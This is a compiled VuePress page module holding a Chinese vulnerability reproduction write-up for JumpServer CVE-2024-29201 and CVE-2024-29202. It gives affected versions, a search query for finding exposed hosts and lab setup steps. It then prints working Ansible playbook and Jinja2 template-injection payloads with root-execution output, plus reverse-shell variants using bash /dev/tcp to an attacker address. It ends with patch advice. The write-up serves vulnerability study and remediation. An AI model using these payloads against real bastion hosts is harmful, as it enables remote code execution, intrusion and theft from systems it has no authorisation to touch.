import{_ as r}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as l,c as d,a as e,b as i,d as n,e as t}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),u=e("p",null,"JumpServer 是使用广泛的开源堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 规范的运维安全审计系统。",-1),p=e("ul",null,[e("li",null,"CVE-2024-29201 远程代码执行漏洞：由于 JumpServer 中的 Ansible 模块未进行完整的输入验证，具有低权限账户的攻击者可以绕过输入验证机制在 Celery 容器中执行任意代码，并从主机中窃取敏感信息或操纵数据库。"),e("li",null,"CVE-2024-29202 Jinjia2 模板注入漏洞：经过身份验证的攻击者可以通过构建恶意 playbook 模板，利用 Ansible 中的 Jinja2 模板引擎在 Celery 容器中执行任意代码，并从主机中窃取敏感信息或操纵数据库。")],-1),m=e("p",null,[e("strong",null,"两个漏洞利用的条件都需要账号且至少有一个资产"),i("。")],-1),v=e("p",null,"参考链接：",-1),b={href:"https://github.com/jumpserver/jumpserver/security/advisories/GHSA-pjpp-cm9x-6rwj",target:"_blank",rel:"noopener noreferrer"},g={href:"https://github.com/jumpserver/jumpserver/security/advisories/GHSA-2vvr-vmvx-73ch",target:"_blank",rel:"noopener noreferrer"},h={href:"https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/",target:"_blank",rel:"noopener noreferrer"},_=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>v3.0.0 &lt;= JumpServer &lt;= v3.10.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;JumpServer-Bastion-Host&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2>`,5),f={href:"https://resource.fit2cloud.com/jumpserver/jumpserver/releases/latest/download/quick_start.sh",target:"_blank",rel:"noopener noreferrer"},x=e("code",null,"quick_start.sh",-1),k=e("code",null,"VERSION",-1),q=e("code",null,"V3.10.6",-1),y=t(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613091657786.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>环境启动后，访问 <code>http://your-ip</code> 即可看到 JumpServer 首页，默认账号密码 <code>admin/admin</code>。默认密码登陆后，JumpServer 将强制要求用户修改密码。</p><h3 id="创建用户" tabindex="-1"><a class="header-anchor" href="#创建用户" aria-hidden="true">#</a> 创建用户</h3><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>用户管理 → 用户列表 → 创建
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>创建用户 <code>threekiii</code>，后续将使用该账户进行攻击操作：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613103551513.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="添加资产" tabindex="-1"><a class="header-anchor" href="#添加资产" aria-hidden="true">#</a> 添加资产</h3><p>准备一个 Linux 资产：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[IP Address]         192.168.43.169
[Username/Password]  kali/kali
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>将这个 Linux 资产添加到资产列表，命名为 <code>test</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>资产管理 → 资产列表 → 创建
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613103706622.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>添加完成后，点击更新，添加账号 <code>kali</code> 并配置密码为 <code>kali</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613103755148.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>点击测试，以测试配置是否成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613104139395.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="授权资产" tabindex="-1"><a class="header-anchor" href="#授权资产" aria-hidden="true">#</a> 授权资产</h3><p>将上一步添加的资产 <code>test</code> 授权给用户 <code>threekiii</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>权限管理 → 资产授权 → 创建
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613104543397.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="cve-2024-29201" tabindex="-1"><a class="header-anchor" href="#cve-2024-29201" aria-hidden="true">#</a> CVE-2024-29201</h3><p>以攻击者用户 <code>threekiii</code> 登录 JumpServer，切换到工作台，创建 Playbook，命名为 <code>CVE-2024-29201</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>作业中心 → 模板管理 → Playbook管理 → 创建 → 创建playbook
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613104951909.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>点击创建的 Playbook 名称 <code>CVE-2024-29201</code>，切换到工作空间，输入以下内容，保存：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[{
     &quot;name&quot;: &quot;RCE playbook&quot;,
     &quot;hosts&quot;: &quot;all&quot;,
     &quot;tasks&quot;: [
       {
         &quot;name&quot;: &quot;this runs in Celery container&quot;,
         &quot;shell&quot;: &quot;id &gt; /tmp/awesome_poc&quot;,
         &quot;\\u0064elegate_to&quot;: &quot;localhost&quot;
} ],
     &quot;vars&quot;: {
     &quot;ansible_\\u0063onnection&quot;: &quot;local&quot;
     }
}]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613105044366.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>切换到作业管理，创建一个新的 Playbook 作业：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>作业中心 → 作业管理 → 创建 → Playbook作业
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613105325676.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>点击提交，运行作业：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613105423507.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613105455637.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入 Celery 容器，成功在 <code>/tmp</code> 目录下创建 <code>awesome_poc</code> 文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>root@jms_celery:/opt/jumpserver# ls /tmp
artifacts  awesome_poc  local.pid  worker_heartbeat_ansible  worker_heartbeat_celery  worker_ready_ansible  worker_ready_celery

root@jms_celery:/opt/jumpserver# cat /tmp/awesome_poc
uid=0(root) gid=0(root) groups=0(root)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613105647162.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="cve-2024-29202" tabindex="-1"><a class="header-anchor" href="#cve-2024-29202" aria-hidden="true">#</a> CVE-2024-29202</h3><p>以攻击者用户 <code>threekiii</code> 登录 JumpServer，切换到工作台，创建 Playbook，命名为 <code>CVE-2024-29202</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>作业中心 → 模板管理 → Playbook管理 → 创建 → 创建playbook
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>点击创建的 Playbook 名称 <code>CVE-2024-29202</code>，切换到工作空间，输入以下内容，保存：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>- name: |
       {% for x in ().__class__.__base__.__subclasses__() %}
         {% if &quot;warning&quot; in x.__name__ %}
           {{
             x()._module.__builtins__[&quot;__import__&quot;](&quot;os&quot;).system(&quot;id &gt; /tmp/awesome_poc_2&quot;)
           }}
         {%endif%}
       {%endfor%}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613105850209.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>切换到作业管理，创建一个新的 Playbook 作业：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>作业中心 → 作业管理 → 创建 → Playbook作业
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613110023524.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>点击提交，运行作业，报错不影响执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613110939724.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入 Celery 容器，成功在 <code>/tmp</code> 目录下创建 <code>awesome_poc_2</code> 文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>root@jms_celery:/opt/jumpserver# ls /tmp
artifacts  awesome_poc  awesome_poc_2  local.pid  worker_heartbeat_ansible  worker_heartbeat_celery  worker_ready_ansible  worker_ready_celery
root@jms_celery:/opt/jumpserver# cat /tmp/awesome_poc_2 
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
192.168.250.7   jms_celery
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613110908696.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="reverse-shell" tabindex="-1"><a class="header-anchor" href="#reverse-shell" aria-hidden="true">#</a> Reverse Shell</h3><p>CVE-2024-29201 payload：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[{
     &quot;name&quot;: &quot;RCE playbook&quot;,
     &quot;hosts&quot;: &quot;all&quot;,
     &quot;tasks&quot;: [
       {
         &quot;name&quot;: &quot;this runs in Celery container&quot;,
         &quot;shell&quot;: &quot;bash -i &gt;&amp; /dev/tcp/your-ip/8888 0&gt;&amp;1&quot;,
         &quot;\\u0064elegate_to&quot;: &quot;localhost&quot;
} ],
     &quot;vars&quot;: {
     &quot;ansible_\\u0063onnection&quot;: &quot;local&quot;
     }
}]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613111436756.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>CVE-2024-29202 payload：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>- name: |
       {% for x in ().__class__.__base__.__subclasses__() %}
         {% if &quot;warning&quot; in x.__name__ %}
           {{
             x()._module.__builtins__[&quot;__import__&quot;](&quot;os&quot;).system(&quot;bash -i &gt;&amp; /dev/tcp/your-ip/8888 0&gt;&amp;1&quot;)
           }}
         {%endif%}
       {%endfor%}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240613111209119.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2>`,59),w={href:"https://github.com/jumpserver/jumpserver/releases%E3%80%82",target:"_blank",rel:"noopener noreferrer"},j=e("li",null,"关闭任务中心，任务中心位于：系统设置 - 功能设置 - 任务中心。",-1);function C(E,V){const a=s("ExternalLinkIcon");return l(),d("div",null,[c,u,p,m,v,e("ul",null,[e("li",null,[e("a",b,[i("https://github.com/jumpserver/jumpserver/security/advisories/GHSA-pjpp-cm9x-6rwj"),n(a)])]),e("li",null,[e("a",g,[i("https://github.com/jumpserver/jumpserver/security/advisories/GHSA-2vvr-vmvx-73ch"),n(a)])]),e("li",null,[e("a",h,[i("https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/"),n(a)])])]),_,e("p",null,[i("下载官方提供的 "),e("a",f,[i("脚本"),n(a)]),i("，编辑 "),x,i("，将脚本中的 "),k,i(" 修改为存在漏洞版本，如："),q,i("。")]),y,e("ol",null,[e("li",null,[i("升级到 v3.10.7 版本。目前官方已在最新版本中修复了上述漏洞，下载链接： "),e("a",w,[i("https://github.com/jumpserver/jumpserver/releases。"),n(a)])]),j])])}const J=r(o,[["render",C],["__file","JumpServer 远程代码执行漏洞 CVE-2024-29201_CVE-2024-29202.html.vue"]]);export{J as default};
